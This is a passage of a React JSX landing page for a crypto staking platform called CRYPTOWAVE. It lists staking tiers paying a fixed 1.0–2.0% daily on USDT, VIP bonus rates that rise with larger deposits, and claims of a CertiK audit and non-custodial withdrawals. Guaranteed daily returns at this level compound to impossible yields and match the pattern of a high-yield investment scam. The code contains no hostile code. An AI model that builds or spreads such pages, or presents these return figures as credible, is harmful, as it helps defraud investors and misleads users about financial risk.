              <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                <circle cx="16" cy="16" r="12" stroke="currentColor" strokeWidth="2"/>
                <path d="M16 8V16L20 20" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
              </svg>
            </div>
            <h3>Auto-Compound</h3>
            <p>Set it and forget it. Earnings automatically compound to maximize your returns.</p>
          </div>

          <div className="feature-card">
            <div className="feature-icon">
              <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                <path d="M16 2L19.5 12.5L30 16L19.5 19.5L16 30L12.5 19.5L2 16L12.5 12.5L16 2Z" stroke="currentColor" strokeWidth="2" strokeLinejoin="round"/>
              </svg>
            </div>
            <h3>VIP Levels</h3>
            <p>Automatic upgrades with exclusive bonus rates and priority support.</p>
          </div>

          <div className="feature-card">
            <div className="feature-icon">
              <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                <rect x="4" y="8" width="24" height="18" rx="2" stroke="currentColor" strokeWidth="2"/>
                <path d="M4 14H28" stroke="currentColor" strokeWidth="2"/>
                <circle cx="10" cy="20" r="1.5" fill="currentColor"/>
              </svg>
            </div>
            <h3>Flexible Withdrawal</h3>
            <p>Access your earnings or full balance anytime. No lock-up periods.</p>
          </div>
        </div>
      </section>

      {/* ── Staking Tiers Section ── */}
      <section className="tiers" id="tiers">
        <h2 className="section-title">
          <span>Staking Tiers</span>
          <div className="title-underline"></div>
        </h2>

        <div className="tiers-grid">
          <div className="tier-card tier-starter">
            <div className="tier-header">
              <h3>Starter</h3>
              <div className="tier-apy">1.0% Daily</div>
            </div>
            <div className="tier-range">1 – 10,000 USDT</div>
            <ul className="tier-features">
              <li>Daily compounding</li>
              <li>Standard support</li>
              <li>Withdraw anytime</li>
            </ul>
          </div>

          <div className="tier-card tier-growth">
            <div className="tier-badge">Popular</div>
            <div className="tier-header">
              <h3>Growth</h3>
              <div className="tier-apy">1.5% Daily</div>
            </div>
            <div className="tier-range">10,001 – 50,000 USDT</div>
            <ul className="tier-features">
              <li>Enhanced returns</li>
              <li>Priority support</li>
              <li>VIP eligibility</li>
              <li>Analytics dashboard</li>
            </ul>
          </div>

          <div className="tier-card tier-premium">
            <div className="tier-badge">Premium</div>
            <div className="tier-header">
              <h3>Premium</h3>
              <div className="tier-apy">2.0% Daily</div>
            </div>
            <div className="tier-range">50,001+ USDT</div>
            <ul className="tier-features">
              <li>Maximum APY</li>
              <li>VIP 2 &amp; 3 access</li>
              <li>Dedicated support</li>
              <li>Advanced analytics</li>
              <li>Early feature access</li>
            </ul>
          </div>
        </div>
      </section>

      {/* ── VIP Benefits Section ── */}
      <section className="vip-section" id="vip">
        <div className="vip-content">
          <h2 className="section-title">
            <span>VIP Benefits</span>
            <div className="title-underline"></div>
          </h2>
          <p className="vip-description">
            Automatic tier upgrades based on your staked balance.
            Higher tiers unlock enhanced daily rates and exclusive perks.
          </p>

          <div className="vip-table">
            <div className="vip-row vip-header">
              <div className="vip-cell">Level</div>
              <div className="vip-cell">Requirement</div>
              <div className="vip-cell">Bonus Rate</div>
              <div className="vip-cell">Perks</div>
            </div>
            <div className="vip-row">
              <div className="vip-cell" data-label="Level"><strong>Normal</strong></div>
              <div className="vip-cell" data-label="Requirement">0+ USDT</div>
              <div className="vip-cell" data-label="Bonus Rate">+0%</div>
              <div className="vip-cell" data-label="Perks">Standard support</div>
            </div>
            <div className="vip-row highlight">
              <div className="vip-cell" data-label="Level"><strong>VIP 1</strong></div>
              <div className="vip-cell" data-label="Requirement">10,000+ USDT</div>
              <div className="vip-cell" data-label="Bonus Rate">+0.25%</div>
              <div className="vip-cell" data-label="Perks">Priority support</div>
            </div>
            <div className="vip-row highlight">
              <div className="vip-cell" data-label="Level"><strong>VIP 2</strong></div>
              <div className="vip-cell" data-label="Requirement">50,000+ USDT</div>
              <div className="vip-cell" data-label="Bonus Rate">+0.5%</div>
              <div className="vip-cell" data-label="Perks">Dedicated manager</div>
            </div>
            <div className="vip-row highlight">
              <div className="vip-cell" data-label="Level"><strong>VIP 3</strong></div>
              <div className="vip-cell" data-label="Requirement">100,000+ USDT</div>
              <div className="vip-cell" data-label="Bonus Rate">+1.0%</div>
              <div className="vip-cell" data-label="Perks">All features unlocked</div>
            </div>
          </div>
        </div>
      </section>

      {/* ── Security Section ── */}
      <section className="security-section" id="security">
        <h2 className="section-title">
          <span>Security First</span>
          <div className="title-underline"></div>
        </h2>

        <div className="security-grid">
          <div className="security-card">
            <div className="security-icon">🔒</div>
            <h4>Audited Smart Contracts</h4>
            <p>Professionally audited by CertiK. OpenZeppelin security standards.</p>
          </div>
          <div className="security-card">
            <div className="security-icon">⚡</div>
            <h4>Non-Custodial</h4>
            <p>You control your funds. Withdraw anytime without permission.</p>
          </div>
          <div className="security-card">
            <div className="security-icon">🛡️</div>
            <h4>Emergency Pause</h4>
            <p>Circuit breaker protection for unexpected situations.</p>
          </div>
          <div className="security-card">
            <div className="security-icon">📊</div>
            <h4>Transparent</h4>
            <p>All transactions visible on-chain. Fully verifiable.</p>
          </div>
        </div>
      </section>

      {/* ── Footer ── */}
      <footer className="footer">
        <div className="footer-content">
          <div className="footer-brand">
            <div className="logo-icon">⟐</div>
            <span>CRYPTOWAVE</span>
          </div>
          <div className="footer-links">
            <a href="#about">Documentation</a>
            <a href="#security">Security Audit</a>
            <a href="#tiers">Terms</a>
            <a href="#vip">Privacy</a>
          </div>
          <div className="footer-social">
            <a href="#twitter" aria-label="Twitter">X</a>
            <a href="#telegram" aria-label="Telegram">T</a>
            <a href="#discord" aria-label="Discord">D</a>
          </div>
        </div>
        <div className="footer-bottom">
          <p>&copy; 2025 CRYPTOWAVE. Audited by CertiK. Built on Ethereum.</p>
        </div>
      </footer>
    </div>
  );
}

export default App;
